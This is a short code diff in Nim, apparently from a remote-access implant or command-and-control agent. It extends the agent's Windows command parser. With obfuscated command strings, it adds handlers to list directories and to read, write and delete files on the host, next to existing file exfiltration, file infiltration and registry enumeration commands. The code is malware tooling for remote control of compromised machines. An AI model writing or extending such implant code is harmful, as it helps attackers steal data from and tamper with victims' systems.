@@ -762,7 +762,15 @@ proc windows_parse_command*(command: JsonNode): bool =
         of protectString("download"):
             is_success = exfil_file(client, command[protectString("src")].getStr())
         of protectString("upload"):
-            is_success = write_file(client, command[protectString("src_b64")].getStr(), command[protectString("dst")].getStr())            
+            is_success = infil_file(client, command[protectString("src_b64")].getStr(), command[protectString("dst")].getStr())   
+        of protectString("listdir"):
+            is_success = list_dir(client, command[protectString("path")].getStr(), command[protectString("rec")].getBool())     
+        of protectString("fread"):
+            is_success = fread(client, command[protectString("path")].getStr()) 
+        of protectString("fwrite"):
+            is_success = fwrite(client, command[protectString("path")].getStr(), command[protectString("content")].getStr(), command[protectString("append")].getBool())                                  
+        of protectString("fdelete"):
+            is_success = fdelete(client, command[protectString("path")].getStr())
         of protectString("regenumkeys"):
             is_success = wrap_regenumkeys(command[protectString("key")].getStr())
         of protectString("regenumvalues"):
